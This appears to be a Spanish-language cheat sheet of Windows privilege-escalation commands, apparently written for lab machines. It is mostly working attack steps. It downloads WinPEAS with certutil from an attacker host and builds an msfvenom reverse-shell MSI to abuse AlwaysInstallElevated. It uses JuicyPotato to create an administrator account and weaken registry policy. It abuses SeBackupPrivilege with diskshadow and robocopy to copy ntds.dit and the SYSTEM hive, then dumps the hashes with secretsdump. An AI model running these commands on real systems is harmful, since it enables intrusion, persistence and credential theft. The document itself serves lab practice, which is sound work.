- Ver usuarios disponibles
```powershell
net user

tree /f /a

net localgroup "Remote Management Users"
```

- Ver carpetas ocultas en C:/ u otras
```powershell
dir -Force
```

- Probar con winpeas
```powershell
cd C:/Windows/Temp
mkdir elevate

upload Winpeasx64.exe
```

- Leer historico Powershell
```powershell
type AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```


- Descargar
```powershell
certutil.exe -f -urlcache -split http://10.10.14.10/WinPeas.exe Winpeas.exe
```

	## always Install elevated


```bash
msfvenom -p windows/x64/shell_reverse_tcp -a x64 --platform windows LHOST=10.10.14.10 LPORT=1234 -f msi -o bad.msi

msiexec /quiet /qn /i C:\windows\temp\a\bad.msi
```


## SeImpersonatePriv

```bash
.\JuicyPotato.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c net user arra arra123 /add" -l 1337

.\JuicyPotato.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c net localgroup Administrators arra /add" -l 1337

.\JuicyPotato.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1337

psexec.py WORKGROUP/arra@10.10.10.63 cmd.exe

#Si falla algo
.\JuicyPotato.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL" -l 1337
```

## SeBackupPriv

```bash
robocopy /b C:\Users\Administrator\Desktop\ C:\
```

- Si esta encriptado
```bash
https://github.com/k4sth4/SeBackupPrivilege

import-module .\SeBackupPrivilegeCmdLets.dll
import-module .\SeBackupPrivilegeUtils.dll
```
- haces un archivi llamado `diskshadow.txt`
```bash
set context persistent nowriters 
set metadata c:\Windows\Temp\c.cab 
add volume c: alias r1pfr4n 
create 
expose %r1pfr4n% x:
```

- Tambien guardas el system y lo descargar en local
```bash
reg.exe save hklm\system system.save
```

- Abusas el diskshadow
```bash
diskshadow.exe /s diskshadow.txt

robocopy /b x:\Windows\NTDS\ . ntds.dit
```

- Sacas los datos
```bash
secretsdump.py -system system.save -ntds ntds.dit LOCAL
```
